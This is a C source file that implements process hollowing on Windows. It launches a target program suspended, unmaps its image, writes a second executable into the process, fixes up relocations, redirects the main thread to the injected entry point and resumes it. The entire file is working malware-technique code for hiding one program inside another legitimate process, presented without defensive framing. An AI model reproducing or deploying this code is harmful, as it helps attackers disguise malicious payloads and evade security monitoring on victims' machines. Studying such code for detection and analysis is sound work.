#include <stdio.h>
#include "hollow.h"

int ProcessHollow(const char* pTarget, const char* pInjection)
{
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	printf("Running the target executable:%s \r\n", pTarget);

	if (!CreateProcess(
		NULL, (LPSTR)pTarget, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi
	))				 // Start the target program.
	{
		perror("[Error] Unable to run the target executable.");
		return 1;
	}

	printf("Opening the injection executable:%s \r\n", pInjection);

	HANDLE hFile = CreateFile(
		pInjection, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL
	); // Open the injection executable
	if (hFile == INVALID_HANDLE_VALUE)
	{
		perror("[Error] Unable to open the injection executable. ");

		TerminateProcess(pi.hProcess, 1);	// open the injection executable failed, terminate the child process before exiting.
		return 1;
	}

	DWORD nSizeOfFile = GetFileSize(hFile, NULL);	// Get the size of the injection executable
	if (nSizeOfFile == INVALID_FILE_SIZE)
	{
		perror("[Error] Unable to Get the injection executable size. ");

		CloseHandle(hFile);		// Close the file handle
		TerminateProcess(pi.hProcess, 1);	// Get size of the injection executable failed, terminate the child process before exiting.
		return 1;
	}

	PVOID pFile = VirtualAlloc(
		NULL, nSizeOfFile, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);	// Allocate memory for the executable file
	if (!pFile)
	{
		perror("[Error] Unable to allocate memory for the executable file. ");

		CloseHandle(hFile);		// Close the file handle
		TerminateProcess(pi.hProcess, 1); // Allocate memory failed, terminate the child process.
		return 1;
	}

	DWORD nNumberOfBytesToRead = 0;
	if (!ReadFile(hFile, pFile, nSizeOfFile, &nNumberOfBytesToRead, NULL))	// Read the executable file from disk
	{
		perror("[Error] Unable to read the injection executable. ");

		CloseHandle(hFile);		// Close the file handle
		TerminateProcess(pi.hProcess, 1);	// Read the injection executable failed, terminate the child process.
		return 1;
	}
	CloseHandle(hFile);		// Close the file handle

	IMAGE_DOS_HEADER* pDos = (IMAGE_DOS_HEADER*)pFile;
	if (pDos->e_magic != IMAGE_DOS_SIGNATURE) // Check the executable vaild
	{
		printf("[Error] Invalid executable.\r\n");

		TerminateProcess(pi.hProcess, 1); // executable is invaild, terminate the child process.
		return 1;
	}

	IMAGE_NT_HEADERS* pNt = (IMAGE_NT_HEADERS*)((BYTE*)pFile + pDos->e_lfanew); // Get the address of the IMAGE_NT_HEADERS in memory
	if (pNt->Signature != IMAGE_NT_SIGNATURE) // Check the executable vaild
	{
		printf("[Error] Invalid executable.\r\n");

		TerminateProcess(pi.hProcess, 1); // executable is invaild, terminate the child process.
		return 1;
	}

	printf("Injection imagebase:0x%p \r\n", pNt->OptionalHeader.ImageBase);

	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_INTEGER;
	if (!GetThreadContext(pi.hThread, &ctx))// Get the thread context of the child process's main thread
	{
		perror("[Error] Unable to get the main thread context of target process. ");

		TerminateProcess(pi.hProcess, 1); // GetThreadContext failed, terminate the child process.
		return 1;
	}

	PVOID pTargetBase = nullptr;
	if (!ReadProcessMemory(
		pi.hProcess, 
		(PVOID)(ctx.Ebx + 8), 
		&pTargetBase, 
		sizeof(PVOID), 
		NULL))	// Read address of the target imagebase from the PEB 
	{
		perror("[Error] Unable to read the memory of target process. ");

		TerminateProcess(pi.hProcess, 1); // ReadProcessMemory failed, terminate the child process.
		return 1;
	}

	printf("Target imagebase:0x%p \r\n", pTargetBase);
	
	PVOID pRealBase = nullptr;
	if ((DWORD)pTargetBase == pNt->OptionalHeader.ImageBase)
	{
		HMODULE hNTDLL = GetModuleHandle("ntdll");

		FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");

		_NtUnmapViewOfSection NtUnmapViewOfSection =
			(_NtUnmapViewOfSection)fpNtUnmapViewOfSection;

		printf("Unmapping original section. \r\n");

		if (NtUnmapViewOfSection(pi.hProcess,pTargetBase))	//Unmapping the original section before allocate memory on it.
		{
			perror("[Error] Unmapping original section failed. ");

			TerminateProcess(pi.hProcess, 1); // Unmapping original section failed, terminate the child process.
			return 1;
		}
		pRealBase = VirtualAllocEx(
			pi.hProcess, 
			(PVOID)pNt->OptionalHeader.ImageBase, 
			pNt->OptionalHeader.SizeOfImage, 
			MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
		); // Allocate memory on original section for the executable image
		if (!pRealBase)
		{
			perror("[Error] Unable to allocate memory in child process. ");

			TerminateProcess(pi.hProcess, 1); // Allocate memory failed, terminate the child process.
			return 1;
		}
	}
	else
	{
		pRealBase = VirtualAllocEx(
			pi.hProcess,
			NULL,
			pNt->OptionalHeader.SizeOfImage,
			MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
		); // Allocate memory at random for the executable image
		if (!pRealBase)
		{
			perror("[Error] Unable to allocate memory in child process. ");

			TerminateProcess(pi.hProcess, 1); // Allocate memory failed, terminate the child process.
			return 1;
		} 

		if (!WriteProcessMemory(
			pi.hProcess,
			(PVOID)(ctx.Ebx + 8),
			(PVOID)&pRealBase,
			sizeof(PVOID),
			NULL))	// If the memory address is different from the target imagebase, the target imagebase needs to be fixed.
		{
			perror("[Error] Fix the target imagebase failed. ");

			TerminateProcess(pi.hProcess, 1); // WriteProcessMemory failed, terminate the child process.
			return 1;
		}
	}
	
	DWORD dwDiffernce = (DWORD)pRealBase -pNt->OptionalHeader.ImageBase;
	if (dwDiffernce)
	{
		pNt->OptionalHeader.ImageBase = (DWORD)pRealBase;
		//If injection imageBase changed, injection imageBase needs to be fixed
	}
	

	printf("Memory allocated. Address: 0x%p\n", pRealBase);

	printf("Writing executable image into child process.\n");

	if (!WriteProcessMemory(
		pi.hProcess,
		pRealBase,
		pFile,
		pNt->OptionalHeader.SizeOfHeaders,
		NULL))	// Write the header of the injection executable into child process
	{
		perror("[Error] Unable to write the header of the injection executable into child process. ");

		TerminateProcess(pi.hProcess, 1); // WriteProcessMemory failed, terminate the child process.
		return 1;
	}

	IMAGE_DATA_DIRECTORY relocData =
		pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	DWORD dwRelocAddr = 0;
	PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)((LPBYTE)pFile + pDos->e_lfanew + sizeof(IMAGE_NT_HEADERS));
	
	for (size_t i = 0; i < pNt->FileHeader.NumberOfSections; i++)
	{
		if (pSec->VirtualAddress == relocData.VirtualAddress)
		{
			dwRelocAddr = pSec->PointerToRawData;
		}
		if (!WriteProcessMemory(
			pi.hProcess,
			(PVOID)((LPBYTE)pRealBase + pSec->VirtualAddress),
			(PVOID)((LPBYTE)pFile + pSec->PointerToRawData),
			pSec->SizeOfRawData,
			NULL)) // Write the rest sections of the injection executable into child process
		{
			perror("[Error] Unable to write the rest sections of the injection executable into child process. ");

			TerminateProcess(pi.hProcess, 1); // WriteProcessMemory failed, terminate the child process.
			return 1;
		}
		pSec = (PIMAGE_SECTION_HEADER)((PBYTE)pSec + sizeof(IMAGE_SECTION_HEADER));

	}

	// If injection imageBase changed, the import table needs to be fixed
	if (dwDiffernce)
	{
		DWORD dwOffset = 0;
		while (dwOffset < relocData.Size)
		{
			PIMAGE_BASE_RELOCATION pReloc =
				(PIMAGE_BASE_RELOCATION)((PBYTE)pFile + dwRelocAddr + dwOffset);

			dwOffset += sizeof(IMAGE_BASE_RELOCATION);

			DWORD dwBlockCount = 
				(pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))
				/ sizeof(BASE_RELOCATION_TYPEOFFSET);

			PBASE_RELOCATION_TYPEOFFSET pBlocks =
				(PBASE_RELOCATION_TYPEOFFSET)((PBYTE)pFile + dwRelocAddr + dwOffset);

			for (size_t i = 0; i < dwBlockCount; i++)
			{
				dwOffset += sizeof(BASE_RELOCATION_TYPEOFFSET);

				if (pBlocks[i].Type == 0)
					continue;

				DWORD dwFieldAddress =
					pReloc->VirtualAddress + pBlocks[i].Offset;

				DWORD dwValue = 0;
				if (!ReadProcessMemory
				(
					pi.hProcess,
					(PVOID)((DWORD)pRealBase + dwFieldAddress),
					&dwValue,
					sizeof(DWORD),
					0
				))
				{
					perror("[Error] Unable to read the value in Relocation. ");

					TerminateProcess(pi.hProcess, 1); // ReadProcessMemory failed, terminate the child process.
					return 1;
				}

				dwValue += dwDiffernce;

				if (!WriteProcessMemory(
					pi.hProcess,
					(PVOID)((DWORD)pRealBase + dwFieldAddress),
					&dwValue,
					sizeof(DWORD),
					0
				))
				{
					perror("[Error] Writing memory failed. ");

					continue;
				}
			}
		}
	}

	ctx.Eax = (DWORD)pRealBase +
		pNt->OptionalHeader.AddressOfEntryPoint;

	printf("Setting thread context\r\n");

	if (!SetThreadContext(pi.hThread, &ctx))
	{
		perror("[Error] Setting context failed. ");

		return 1;
	}

	printf("Resuming thread\r\n");

	//»Ö¸´Ö÷Ïß³Ì
	if (!ResumeThread(pi.hThread))
	{
		perror("[Error] Resuming thread failed. ");

		return 1;
	}

	printf("Process hollowing complete\r\n");

	return 0;
}
